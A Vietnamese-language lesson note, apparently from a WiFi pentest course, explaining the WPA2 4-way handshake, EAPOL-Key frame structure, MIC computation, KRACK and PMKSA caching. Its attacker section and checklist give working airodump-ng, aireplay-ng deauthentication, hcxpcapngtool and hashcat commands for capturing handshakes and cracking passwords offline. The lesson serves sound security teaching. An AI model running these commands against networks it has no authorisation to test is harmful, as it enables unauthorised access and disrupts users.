---
title: "05. 4-Way Handshake & Group Key Handshake Mechanics"
type: foundation
tags: [pentest, wifi, wireless, wpa2, handshake, eapol, foundation, lesson-05]
aliases: [4-Way Handshake]
created: 2026-04-01
---

> **Prerequisites**: [[04-wpa2-key-hierarchy|04. WPA2 Key Hierarchy: PMK → PTK → GTK Derivation]]
> **Objectives**:
> - Hiểu chi tiết 4 message trong 4-way handshake và mục đích của từng message
> - Phân tích EAPOL-Key frame structure ở mức byte
> - Hiểu MIC computation và verification flow
> - Nắm KRACK attack — tại sao nonce reuse phá vỡ CCMP
> - Hiểu Group Key Handshake (2-way) và PMKSA caching

---

## Động lực

4-way handshake là "lễ nghi" xác nhận cả AP và STA đều biết PMK mà không bao giờ truyền PMK trực tiếp. Nó đồng thời thiết lập PTK (unicast) và phân phối GTK (multicast). Đây là phần mạng bị tấn công nhiều nhất trong WPA2 — capture 4 EAPOL frames này là đủ để offline crack password.

---

## Kiến trúc & Cơ chế

### Tổng quan 4-Way Handshake

```mermaid
sequenceDiagram
    participant AP as AP (Authenticator)
    participant STA as STA (Supplicant)
    Note over AP,STA: Cả hai đã có PMK<br>(từ PSK hoặc EAP session)
    AP->>STA: Message 1 (EAPOL-Key)<br>ANonce, PMKID
    Note over STA: STA tạo SNonce<br>Tính PTK = PRF(PMK, ANonce, SNonce, AA, SPA)<br>Tính MIC bằng KCK
    STA->>AP: Message 2 (EAPOL-Key)<br>SNonce, MIC, RSN IE
    Note over AP: AP tính PTK<br>Verify MIC bằng KCK<br>Encrypt GTK bằng KEK
    AP->>STA: Message 3 (EAPOL-Key)<br>GTK (encrypted), MIC, Install PTK flag
    Note over STA: STA verify MIC<br>Decrypt GTK<br>Install PTK và GTK
    STA->>AP: Message 4 (EAPOL-Key)<br>ACK, MIC
    Note over AP: AP verify MIC<br>Install PTK
    Note over AP,STA: Data encryption bắt đầu bằng PTK/GTK
```text
### EAPOL-Key Frame Structure

EAPOL (Extensible Authentication Protocol over LAN) là container protocol. EAPOL-Key frame dùng trong 4-way handshake:

```text
EtherType: 0x888E (802.1X)
EAPOL Header:
  Version: 0x01 hoặc 0x02
  Type: 0x03 (EAPOL-Key)
  Length: payload length

Key Descriptor (95 bytes minimum):
  Descriptor Type: 0x02 (RSN) hoặc 0xFE (WPA)
  Key Information: 2 bytes [critical!]
  Key Length: 2 bytes
  Key Replay Counter: 8 bytes [anti-replay]
  Key Nonce: 32 bytes [ANonce hoặc SNonce]
  Key IV: 16 bytes [for GTK encryption]
  Key RSC: 8 bytes [Receive Sequence Counter]
  Reserved: 8 bytes
  Key MIC: 16 bytes [HMAC-SHA1 hoặc AES-CMAC]
  Key Data Length: 2 bytes
  Key Data: variable [RSN IE, GTK KDE...]
```text
**Key Information field (16 bits) — critical:**

| Bits | Field | Ý nghĩa |
|------|-------|---------|
| 0–2 | Key Descriptor Version | 01=TKIP, 02=AES-CMAC, 03=AES-CMAC-256 |
| 3 | Key Type | 1=Pairwise, 0=Group |
| 4–5 | Reserved | — |
| 6 | Install | 1=Install PTK (Message 3 từ AP) |
| 7 | Key Ack | 1=AP → STA, 0=STA → AP |
| 8 | Key MIC | 1=MIC present (không có trong M1) |
| 9 | Secure | 1=PTK đã install (Message 3, 4) |
| 10 | Error | 1=Michael MIC failure |
| 11 | Request | 1=STA yêu cầu rekey |
| 12 | Encrypted Key Data | 1=Key Data encrypted với KEK |
| 13 | SMK Message | WPA2 mesh (hiếm) |

### Message 1: AP → STA

**AP gửi**: ANonce, PMKID (optional), Key Replay Counter = N

```text
Key Information: 0x008A
  Key Type = 1 (Pairwise)
  Key Ack = 1 (AP → STA)
  Key MIC = 0 (không có MIC)
Key Nonce = ANonce (32 bytes random từ AP)
Key MIC = 0x00 * 16 (empty)
Key Data = RSN PMKID KDE (optional)
```text
STA nhận M1:
- Extract ANonce
- Generate SNonce ngẫu nhiên
- Tính: PTK = PRF-512(PMK, "Pairwise key expansion", Min(AA,SPA) ‖ Max(AA,SPA) ‖ Min(ANonce,SNonce) ‖ Max(ANonce,SNonce))
- Extract: KCK = PTK[0:128], KEK = PTK[128:256], TK = PTK[256:384]

### Message 2: STA → AP

**STA gửi**: SNonce + MIC (dùng KCK)

```text
Key Information: 0x010A
  Key Type = 1 (Pairwise)
  Key Ack = 0 (STA → AP)
  Key MIC = 1 (có MIC)
Key Nonce = SNonce (32 bytes random từ STA)
Key MIC = HMAC-SHA1(KCK, EAPOL frame từ byte 0 đến hết)
           [truncate to 16 bytes]
Key Data = RSN IE (RSN Information Element từ STA's capability)
```text
AP nhận M2:
- Extract SNonce
- Tính PTK (AP bây giờ có đủ ANonce, SNonce, AA, SPA)
- Extract KCK
- Verify Key MIC: HMAC-SHA1(KCK, M2 bytes với MIC field zeroed)
- Nếu MIC đúng → STA biết PMK → proceed

> [!warning] Đây là frame attacker cần nhất
> Message 2 chứa SNonce và MIC. Kết hợp với ANonce từ M1, AA, SPA từ frame headers → đủ để brute-force PMK. hashcat -m 22000 compute PTK từ PMK candidate → tính MIC → so sánh với MIC trong M2.
>
### Message 3: AP → STA

**AP gửi**: GTK (encrypted) + Install flag + MIC

```text
Key Information: 0x13CA
  Install = 1 (STA phải install PTK sau khi verify M3)
  Key Ack = 1 (AP → STA)
  Key MIC = 1 (có MIC)
  Secure = 1 (handshake đang hoàn thành)
  Encrypted Key Data = 1 (GTK được encrypt bằng KEK)
Key Nonce = ANonce (repeat từ M1)
Key MIC = HMAC-SHA1(KCK, M3 bytes)
Key Data = GTK KDE (encrypted với KEK: AES Key Wrap)
           RSN IE (AP's capabilities)
```text
STA nhận M3:
- Verify MIC
- Decrypt GTK: AES Key Unwrap với KEK
- Install PTK (TK → CCMP engine)
- Install GTK

### Message 4: STA → AP

**STA gửi**: ACK + MIC — xác nhận đã install keys

```text
Key Information: 0x030A
  Secure = 1
  Key MIC = 1
Key MIC = HMAC-SHA1(KCK, M4 bytes)
Key Data = empty
```text
AP nhận M4:
- Verify MIC
- Install PTK
- Data exchange bắt đầu

### Key Replay Counter — Anti-Replay

Replay Counter là 8-byte monotonic counter:
- AP bắt đầu với Counter = 0 trong M1
- Mỗi message mới từ AP tăng Counter
- STA chỉ chấp nhận message có Counter > last seen Counter
- Ngăn replay attack: attacker không thể replay M1 vì Counter sẽ không hợp lệ

### KRACK — Key Reinstallation Attack (2017)

Mathy Vanhoef phát hiện: nếu M3 hoặc M4 bị drop (network), AP retransmit M3 với same ANonce. STA reinstall PTK → reset nonce counter (packet number) về 0. Nhưng TK không đổi!

```text
CCMP encrypt: C = AES-CTR(TK, Nonce=PN ‖ AA ‖ Priority) XOR P
Nếu PN reuse với cùng TK → keystream reuse → P1 XOR P2 = C1 XOR C2
```text
**Khai thác KRACK:**
1. Attacker chặn M3 → STA không nhận M4 → AP retransmit M3
2. Attacker forward M3 sau khi STA đã install → STA reinstall → PN reset về 0
3. Thu thập hai ciphertext với cùng PN, TK → recover plaintext

KRACK bị patch bởi: OS vendor refuse reinstall với same PTK, hoặc reset PN xuống 0 bị reject. Tuy nhiên: nhiều embedded devices (IoT, routers) không bao giờ được patch.

### Group Key Handshake (2-way)

Khi GTK cần rotate (STA rời mạng, timer expire):

```mermaid
sequenceDiagram
    participant AP
    participant STA
    AP->>STA: EAPOL-Key (Group 1)<br>New GTK encrypted bằng KEK<br>MIC bằng KCK
    STA->>AP: EAPOL-Key (Group 2)<br>ACK, MIC
    Note over AP,STA: STA install new GTK
```text
### PMKSA Caching — Fast Roaming

PMKSA (Pairwise Master Key Security Association) cache PMK sau authentication thành công:

```text
Cache entry: (PMKID, PMK, lifetime, AP MAC)
```text
Khi STA reassociate với cùng AP (hoặc AP trong cùng PMKSA domain):
1. STA include PMKID trong Association Request / M2
2. AP lookup PMKID → tìm thấy → skip lại EAP authentication
3. Directly run 4-way handshake với cached PMK

→ Giảm latency roaming đáng kể. PMKSA entry expire sau khoảng 12–24 giờ.

---

## Góc nhìn kẻ tấn công

**Capture 4-way handshake:**

```bash
# Terminal 1: capture
airodump-ng -w capture --bssid <BSSID> -c <CH> wlan0mon

# Terminal 2: deauth to force reconnect
aireplay-ng -0 5 -a <BSSID> wlan0mon
# Hoặc target specific client:
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# Verify handshake captured (airodump-ng hiển thị "WPA handshake: XX:XX:...")
```text
**Verify handshake valid:**

```bash
# Check có đủ 4 messages không (ít nhất M1+M2 là đủ cho crack)
hcxpcapngtool capture-01.cap -o hash.hc22000
# Nếu có output → handshake valid

# Crack:
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```text
---

## Pentest Checklist

```text
□ Monitor mode on đúng channel của target AP
□ Deauth clients để force reconnect (capture handshake)
□ Verify handshake: airodump-ng hiển thị "WPA handshake" ở góc phải
□ Convert: hcxpcapngtool → .hc22000 format cho hashcat
□ Confirm có đủ M1+M2 (tối thiểu) hoặc M1+M2+M3+M4 (tốt nhất)
□ Nếu không có clients online: dùng PMKID attack (không cần client)
□ Check KRACK vuln: embedded devices, IoT — check vendor security advisory
```text
---

## Kết nối

```mermaid
flowchart LR
    L05[05. 4-Way Handshake] --> L06[06. PMKID Attack]
    L05 --> L09[09. 802.11w MFP]
    L05 -->|Handshake capture| CRACK[hashcat -m 22000]
    L05 -->|KRACK| NONCE[Nonce reuse → keystream reuse]
```text